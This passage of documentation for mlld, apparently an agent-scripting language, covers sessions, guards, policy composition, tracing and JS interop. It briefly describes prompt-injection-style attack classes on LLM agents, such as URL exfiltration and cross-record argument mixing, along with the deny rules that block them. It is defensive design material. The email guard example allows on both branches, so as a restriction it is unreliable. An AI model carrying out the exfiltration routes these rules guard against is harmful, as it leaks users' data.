@planner.set(runtime: @newRuntime, state: @newState)
@planner.write("runtime.terminal", "submit_final")
@planner.increment("runtime.tool_calls", 1)
@planner.append("log", { tool: @mx.op.name, at: @now() })

exe @bumpCalls(runtime) = { ...@runtime, tool_calls: @runtime.tool_calls + 1 }
@planner.update("runtime", @bumpCalls)

@planner.clear("runtime")
```

Reads use dotted accessors: `var @count = @planner.runtime.tool_calls`. Writes go through methods only — no bare property assignment. `.update(path, @fn)` accepts only pure exes (`js`, `node`, `mlld-exe-block`, `mlld-when`); `llm` exes and tool-dispatching exes are rejected at call time so commit semantics stay simple.

**Bare-name access is a snapshot.** `var @sess = @planner` (used as a value, not a method head) captures an immutable snapshot of the session's current state. Subsequent reads through `@sess.runtime` see the snapshot, not further mutations. Vars never hold live mutable references.

### Strict nesting (security-relevant)

Session resolution inspects only the **nearest enclosing bridge frame**. If the nearest frame did not attach `@planner`, the access raises `MlldSessionNotAttachedError` even if an outer frame attached one with the same name. This is load-bearing for isolation: an inner `@claude()` worker cannot read or mutate an outer planner's session by knowing its declaration name. The only paths for state to cross frames are explicit prompt parameters and shelf slots.

Concurrent calls each get their own session instance — the global-shelf aliasing class of bug is impossible by construction.

Resume runs in a fresh frame and gets a fresh session instance. Writes do not survive resume.

### Guard write-commit semantics

Session writes made inside a guard's execution frame go through a per-guard buffer. The buffer commits atomically on guard allow-exit and discards on deny-exit. This means:

- A `before` guard that writes and then returns `deny` does **not** commit those writes — counters never over-count denied attempts
- An `after` guard never fires on a denied dispatch (structural invariant in the guard path)
- Within a single guard body, reads observe the guard's own pending writes (read-your-writes overlay); between guards, only committed state is visible

Trace events for buffered writes are committed or discarded with the writes — denied guards never leak `session.write` events to trace output, SDK streams, or the post-call snapshot.

This makes guard + session = middleware. Budget caps, counters, terminal-tool latches, and execution logs collapse to short idioms:

```mlld
guard @budget before tool:w = when [
  @planner.runtime.tool_calls >= 20 => deny "budget exhausted"
  * => allow
]

guard @count after tool:w = when [
  * => [
    @planner.increment("runtime.tool_calls", 1)
    @planner.write("runtime.last_decision", @mx.op.name)
    => allow
  ]
]
```

### Trace redaction

Session writes emit `session:write` trace events at `--trace effects` and `--trace verbose`. At `effects`, values carrying sensitivity labels (`secret`, `pii`, `sensitive`) or taint labels (`untrusted`, `influenced`, `fact:*`) render as `<labels=[...] size=N>` placeholders — content is hidden, slot path and label set remain visible. Full content shows only at `--trace verbose`.

Redaction respects `defaults.unlabeled: "untrusted"`: under that setting, unlabeled values are auto-tagged `untrusted` at variable-creation time and therefore redact at `effects` automatically. No explicit policy consultation at emission.

### Post-call inspection

After an LLM call returns, its session final state is reachable on the result value:

```mlld
var @result = @runPlanner(@agent, @query, @prompt)
var @plannerFinal = @result.mx.sessions.planner
```

`@result.mx.sessions.<name>` is an immutable snapshot of the session attached to that call's frame at exit time — keyed by the declaration's canonical exported name, not any caller-side alias. Absent when the call did not attach that session.

The SDK surface mirrors this: `result.sessions` on `ExecuteResult` is an array of `{ name, originPath, finalState, frameId }` aggregating across all calls in the execution. `session_write` events stream during execution. See `sdk/SPEC.md`.

### Trust model

Sessions are runtime-owned mutable state accessed through an explicit method API; no user var is mutated by session writes, so var-immutability and label propagation are unaffected. Sessions store labeled value envelopes — labels survive write/read round-trips. Sessions do **not** mint facts; a session-derived value carries `fact:*` only if the original write already did. Authority remains in records and `=> record` coercion.

---

## 9. Composability

Security in mlld is designed as a **separate concern** that composes cleanly with application logic.

### Policies compose with `union()`

```mlld
import { @secretPolicy } from "./security/secrets.mld"
import { @piiPolicy } from "./security/pii.mld"

policy @combined = union(@secretPolicy, @piiPolicy)
```

`union()` merges policies with the most restrictive rules winning: `allow` sets intersect, `deny` sets union, `locked` is sticky (if either is locked, the result is locked).

### Guards are regular exports

```mlld
>> security/email-guards.mld
guard privileged @emailGuard before tool:w = when [
  @mx.op.name == "send_email" && @mx.args.recipients == ["allowed@company.com"] => allow
  * => allow
]

export { @emailGuard }
```

```mlld
>> app.mld
import { @emailGuard } from "./security/email-guards.mld"
>> Guard is now active in this script
```

### Separation of concerns

The cleanest pattern: application code never references security. Policy and guards are injected from outside — by the SDK, by a security module, or by a build step.

```mlld
>> security/task-policy.mld — injected by the SDK
policy @task = { ... }
guard privileged @valueMatch before tool:w = when [ ... ]
export { @task, @valueMatch }

>> app.mld — pure application logic, no security awareness
import { @claude } from @mlld/claude
import { @dispatch } from "./tools/active.mld"
>> ... does its work, constrained by policy it never sees
```

This means you can change the security posture without touching the application. Swap the policy module, adjust the guards, redeploy. The application code is unchanged.

---

## 10. Debugging with Runtime Tracing

When something goes wrong in a defended agent, the symptom appears far from the cause. A shelf write that silently fails shows up as empty state three turns later. A guard resume that doesn't fire manifests as a collapsed planner loop. A handle that loses proof during JS interop surfaces as an authorization denial on a different phase.

Runtime tracing makes these cause-and-effect chains visible. Enable it with `--trace`:

```bash
mlld run pipeline --trace effects                          >> shelf writes, guard decisions, auth checks
mlld run pipeline --trace handle                           >> only handle lifecycle (handle.issued / .resolved / .resolve_failed / .released)
mlld run pipeline --trace verbose                          >> adds handle lifecycle, LLM calls, record coercions, read projections
mlld run pipeline --trace effects --trace-file tmp/trace.jsonl
```

`--trace handle` and `--trace handles` are equivalent — both isolate handle events.

Trace events are structured — you can filter them with `jq`:

```bash
jq 'select(.category == "auth")' tmp/trace.jsonl           >> which tools were authorized and why
jq 'select(.category == "handle")' tmp/trace.jsonl         >> handle lifecycle
jq 'select(.event == "shelf.stale_read")' tmp/trace.jsonl  >> writes that didn't land
```

**Common debugging workflows:**

- **"Why was my tool call denied?"** Look for `auth.deny` → check `policy.build` for compilation issues → check `policy.compile_drop` to see if bucketed intent entries were dropped (missing proof) → check `handle.resolve_failed` to see if a handle reference was broken.

- **"Why is shelf state empty after a write?"** `shelf.write` with `success: true` followed by a `shelf.stale_read` event means the read returned different data than the write in the same execution context. The runtime catches this and emits the diagnostic with timestamps and expected vs actual values.

- **"Which handle resolved to which value?"** Follow `handle.issued` (where the handle was minted) → `handle.resolved` (where it was consumed by a tool dispatch) → or `handle.resolve_failed` (where it was lost). `handle.released` marks per-call bridge teardown and reports how many handles were in scope for that session.

**Ambient `@mx.*` accessors** (the in-script alternative to the trace stream). When you want to introspect runtime state from inside an mlld expression rather than reading a trace file:

| Accessor | Returns |
|---|---|
| `@mx.handles` | The handles currently issued in the active LLM bridge scope (handle string → value preview, labels, factsource, issuedAt) |
| `@mx.llm.sessionId` | The current bridge session id, or null outside an LLM call |
| `@mx.llm.read` | The active named read mode for this call |
| `@mx.llm.resume` | Resume state object (`{ sessionId, provider, continuationOf, attempt }`) or null |
| `@mx.shelf.writable` / `@mx.shelf.readable` | Slot alias metadata for the current box's shelf scope |
| `@mx.policy.active` | Active policy descriptors for the current execution context |

Use these for assertion-style probes, mid-execution inspection, and tests that verify the right runtime state is in scope. See `builtins-ambient-mx`.

Tracing complements audit logging: audit logs record *that* something happened for compliance, traces explain *why* something happened for debugging. Enable tracing during development and when investigating incidents; leave it off in production.

---

## 11. JS/Python Interop and Proof Preservation

The `js {}` and `py {}` boundaries are the weakest link in the proof chain. Values cross from mlld (where they carry labels, handles, and facts) into JS/Python (where they're plain objects). If you serialize and parse inside a JS block, mlld metadata is erased and cannot be reconstructed.

### Rules for JS/Python blocks

**Return native objects, not JSON strings.** mlld handles the conversion.

```mlld
>> RIGHT: return a native object
exe @parseContact(raw) = js {
  return { name: raw.name, email: raw.email }
}

>> WRONG: serializing erases metadata, forces callers to re-parse
exe @parseContact(raw) = js {
  return JSON.stringify({ name: raw.name, email: raw.email })
}
```

**Don't `JSON.stringify` / `JSON.parse` inside JS.** Label metadata and proof are lost. Work with values as-is.

**Handle wrappers pass through as plain objects.** A `{ handle: "h_xxx" }` enters JS as a normal one-key object. Don't special-case it. Don't try to resolve it inside JS. If you need handle-aware logic, do it in mlld, not JS — the runtime handles resolution automatically at dispatch.

**Don't reimplement tool metadata in JS.** If you're writing a JS helper that reads the bound input record's `facts:` / `data:` / `correlate:` (or any of the legacy `controlArgs`, `updateArgs`, `exactPayloadArgs` fields), stop. That's the runtime's job. Use `@policy.build` with the full bucketed intent, not a JS bridge that synthesizes a "richer intent" from metadata lookups.

**Need `.mx` metadata in JS?** Use `.keep` or `.keepStructured` on the value before passing it as a parameter:

```mlld
var @result = @processEmail(@email.keep)
```

This preserves the full StructuredValue wrapper so JS can access `.mx` for metadata and `.data` for the content. Note this changes the interface — JS code must read `.data` explicitly instead of receiving raw data directly.

### The general principle

If you find yourself writing JS that inspects tool metadata, reconstructs authorization intent, resolves handles, or projects state — stop and ask which mlld primitive you're reimplementing. The runtime owns these contracts. Benchmark-side glue that "just makes this one case pass" accumulates into the exact kind of compatibility layer that mlld exists to replace.

Concrete examples of patterns to avoid:

- **A JS helper that reads a tool's input record (or the legacy `updateArgs` / `exactPayloadArgs`) and merges `literal_inputs` into the authorization intent.** The `known` bucket is the primitive — put user-typed values there.
- **A JS helper that projects slot state down to referenced inputs.** The worker should receive typed `target` and `inputs` parameters, resolved via `@fyi.shelf` before the worker is called.
- **A JS helper that validates handle shapes.** The runtime validates handles at dispatch and at record coercion. If you're validating them in JS, you've lost the proof chain.

---

## 12. Key Points

- **Labels are immutable facts.** Once applied, they propagate through all transformations. You can't strip them by accident.
- **`untrusted` is sticky.** You can't wash it off by adding `trusted`. Only privileged guards can remove it.
- **Policy denials are hard errors** for unlocked policies unless a privileged guard overrides them. For locked policies, they're absolute — nothing can bypass them.
- **The two-step pattern separates concerns.** Label functions with what they *do* (semantic), and let policy decide what's *risky* (classification).
- **Source labels are automatic.** You never need to declare `src:cmd` or `src:file` — the runtime handles it.
- **`defaults.unlabeled`** is the simplest way to get broad protection. Set it to `"untrusted"` and everything without an explicit label is treated as suspect.
- **Policies compose.** Use `union()` to merge multiple policies; the most restrictive rules win.
- **Guards add precision.** Policies set broad rules. Guards handle specific cases — inspection, transformation, and strategic exceptions.
- **Privileged guards bridge policy and practice.** They let you say "I know this is generally blocked, but this specific case is authorized" — without weakening the general rule.
- **`locked: true` is the escape hatch.** When a constraint must be absolute, lock the policy. No guard, no matter how privileged, can override it.
- **Records are the trust boundary.** `facts` fields carry authorization-grade proof. `data` fields don't. The record author decides — auditable and explicit.
- **Read projections control disclosure.** `read` on a record determines what the LLM sees: bare, value (value + handle), masked (preview + handle), handle-only, or omitted. Named modes let one record serve different agents.
- **Handles are per-call ephemeral.** Each `@claude` invocation mints fresh handle strings via projection; they are not portable across calls. Cross-phase identity flows through the underlying values plus their `factsources` metadata, traveling via shelves and `known` values. The proof claims registry is value-keyed, not handle-string-keyed. Shelf projection caches store handle-free role projection plans keyed by `.mx.key` and mint fresh handles at read time. `value` read mode gives the LLM both the readable value and a per-call handle. Worker returns use the `handle` field type to enforce that fact-bearing values cross phase boundaries as projection-minted handles.
- **The boundary is narrowed.** Handle resolution is per-call (bridge mint table only). The builder auto-upgrades `known` values to `resolved` when a value-keyed match exists in the proof claims registry — that's the cross-phase reconciliation path. `resolved` accepts handle strings minted in the dispatching call's own scope OR fact-bearing values passed directly from orchestrator code (the runtime walks the value's factsources to mint a fresh handle). Bare literals and masked previews are rejected. There is no longer a "tolerance band" for accepting any emitted form in the same session.
- **Bucketed intent has three buckets, all uniform.** `resolved`, `known`, and `allow` work as top-level keys to `@policy.build`. Each bucket maps to a different validation path (factsource resolution, task-text verification, no-check). `allow: { tool: true }` authorizes a tool unconditionally regardless of whether its input record declares `facts:`. The bucketed shape is the canonical planner-emitter form; the lower-level flat shape is also accepted for programmatic construction. Mixing the two in a single intent is a hard error, not a silent drop.
- **Two surfaces for reading shelf state.** Orchestrator code uses `@shelf.read(@<shelf>.<slot>)` to read a slot's full structured value (labels and factsources intact). LLM prompt templates use `@fyi.shelf.<alias>` to interpolate slot contents at template-render time, scoped by the box's read access. Wildcard shelf slots use the same surfaces, including `@state.<record_type>` and `@state.*` box scopes. The runtime's auto-injected `<shelf_notes>` lists slot SCHEMA, not slot CONTENTS — so a worker that needs slot values must either receive them via prompt variable (orchestrator pre-read) or via template interpolation inside the box scope. The pre-read pattern is cleaner for dispatcher code: prompt assembly stays in one place.
- **Box shelf scope can be a value.** `box { shelf: @scopeValue }` accepts a regular variable holding `{read: [...], write: [...]}` arrays of slot refs. This lets framework code construct shelf scopes dynamically without parser-level magic. Aliases default to the slot's declared name; `as <alias>` is optional cosmetic renaming for the rare case where a role-based name is wanted.
- **Wrapper exes can catch their own policy denials** via `when [denied => ..., * => ...]`. The runtime routes the denial to the `denied =>` arm so the wrapper can fall back to a debiased path (e.g. structured re-extraction, escalation). Used by the advice gate pattern in §6/§7. Block bodies with `let` bindings work — the runtime catches denials regardless of body shape.
- **`correlate: true` on the input record is structurally enforced.** A write tool whose input record declares multiple `facts:` fields has its dispatches checked at runtime — every fact arg's `factsources` must point to the same source record instance. Cross-record dispatches are denied with `Rule 'correlate-control-args'`. Multi-fact records default to `correlate: true`; single-fact records default to `false`. Defends the canonical "mix one record's id with another record's recipient" attack class.
- **`with { policy }` composes additively by default.** A per-step `@auth.policy` from `@policy.build` is merged with the env's active policy — capabilities and locked rules from the env are preserved, the planner's exemptions are added on top. Use the array form `[@base, @auth]` when you want explicit composition, and `replace: true` only as a sandbox escape hatch (it drops env locked rules; reserved for trusted infrastructure).
- **Positive checks require proof, not just absence of taint.** `no-send-to-unknown` and `no-destroy-unknown` require fact proof or `known` on the fact args declared by the tool's input record. With a bound input record, any `fact:*` on a `facts:` field suffices. No proof, no action.
- **Trust refinement gives record declarations teeth.** `untrusted` is cleared on fact fields during `=> record` coercion. Data fields stay tainted.
- **`no-novel-urls` closes the URL exfiltration channel.** URLs in LLM-influenced tool calls must exist verbatim in external input. Constructed URLs are blocked regardless of encoding.
- **Phase-shaped tools beat orchestration repair.** Design tools for resolve, extract, or execute — never all three. Mixed-phase tools force the orchestrator to compensate in code. Phase-shaped tools let the framework do the work.
- **Workers receive typed inputs, not state blobs.** Resolve slot references into concrete values *before* calling the worker. A worker that receives the full shelf state and is told "use only the referenced inputs" will drift. Structural enforcement beats prompt discipline.
- **User-typed literals go in `known`.** Values the user explicitly provided in their task text belong in the `known` bucket, keyed by the tool they satisfy. Don't reimplement this as a JS helper that reads tool metadata — the `known` bucket is the primitive.
- **The weakest proof boundary is JS/Python interop.** Return native objects, not JSON strings. Don't `JSON.stringify` inside JS blocks. Don't special-case handle wrappers. If you're reading tool metadata in JS, you're reimplementing a runtime contract.
- **Runtime tracing is the debugging tool.** `mlld run pipeline --trace effects` surfaces the auth/policy/handle chain. `--trace verbose` catches stale shelf reads. Enable it when something is failing in ways the error messages don't explain.
